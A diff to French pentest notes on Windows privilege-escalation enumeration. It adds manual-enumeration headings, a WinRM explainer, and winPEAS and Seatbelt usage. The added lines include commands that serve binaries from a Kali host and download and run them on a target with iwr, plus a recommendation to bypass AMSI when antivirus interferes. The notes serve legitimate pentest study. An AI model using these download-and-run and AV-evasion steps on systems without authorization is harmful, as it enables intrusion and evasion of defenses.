@@ -8,6 +8,8 @@
 
 ## Enumerating Windows
 
+### Enumération manuelle
+
 **Username et hostname**
 ```cmd
 whoami
@@ -153,6 +155,8 @@ type C:\Users\Public\Transcripts\transcript01.txt
 
 **Se connecter en WinRM avec des credentials**
 
+Équivalent Windows de SSH, basé sur HTTP/HTTPS, port 5985 (HTTP) ou 5986 (HTTPS).
+
 ```powershell
 $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential("<username>", $password)
@@ -169,4 +173,78 @@ Logs les scripts PowerShell exécutés. Dans l'Event Viewer : `Applications and 
 
 ```powershell
 Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104} | Select-Object TimeCreated, Message | Format-List
+```
+
+
+### Enumération automatique
+
+#### winPEAS
+
+Peut être bloqué par l'AV. Alternatives : Seatbelt, JAWS. Ne remplace pas l'énumération manuelle (peut rater des fichiers, mal identifier l'OS, etc.).
+
+Formats disponibles sur Kali dans `/usr/share/peass/winpeas/` :
+
+| Format | Avantages | Inconvénients |
+|--------|-----------|---------------|
+| `.exe` | Plus complet, standalone | Détecté facilement par AV |
+| `.ps1` | Flexible, AMSI peut être bypassé | AMSI, politique d'exécution restrictive |
+| `.bat` | Furtif, pas de dépendances | Très limité en fonctionnalités |
+
+AMSI (Antimalware Scan Interface) : interface Windows qui permet aux AV de scanner les scripts PowerShell en mémoire avant exécution, même obfusqués.
+
+Recommandation pentest : `.ps1` avec bypass AMSI si l'AV est un obstacle, sinon `.exe` pour les résultats les plus complets.
+
+```bash
+# Kali : copier le binaire et servir via HTTP
+cp /usr/share/peass/winpeas/winPEASx64.exe .
+python3 -m http.server 80
+```
+
+```powershell
+# Cible : télécharger et exécuter
+iwr -uri http://<ip>/winPEASx64.exe -Outfile winPEAS.exe
+.\winPEAS.exe
+
+.\winpeas.exe > output.txt
+.\winpeas.exe | Tee-Object -FilePath output.txt
+```
+
+#### Seatbelt
+
+Compiler sur une machine Windows avec VS Build Tools, transférer le binaire sur la cible.
+
+```cmd
+# Prérequis sur la machine de compilation
+winget install Microsoft.VisualStudio.2022.BuildTools
+git clone https://github.com/GhostPack/Seatbelt.git
+cd Seatbelt
+msbuild Seatbelt.sln /p:Configuration=Release
+
+
+```
+
+```powershell
+# Cible : télécharger et exécuter
+iwr -uri http://<ip>/Seatbelt.exe -Outfile Seatbelt.exe
+.\Seatbelt.exe -group=all
+.\Seatbelt.exe -group=all > output.txt
+```
+
+**si .NET 3.5 absent sur la cible**
+
+Recompiler en ciblant .NET 4.x. Vérifier la version disponible sur la machine de compilation, modifier `Seatbelt\Seatbelt.csproj`, puis recompiler.
+
+```cmd
+# Vérifier les versions .NET disponibles
+winget install Microsoft.DotNet.Framework.DeveloperPack_4
+dir "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\"
+```
+
+```xml
+<!-- Seatbelt.csproj : modifier la ligne TargetFrameworkVersion -->
+<TargetFrameworkVersion>v4.8.1</TargetFrameworkVersion>
+```
+
+```cmd
+msbuild Seatbelt.sln /p:Configuration=Release
 ```
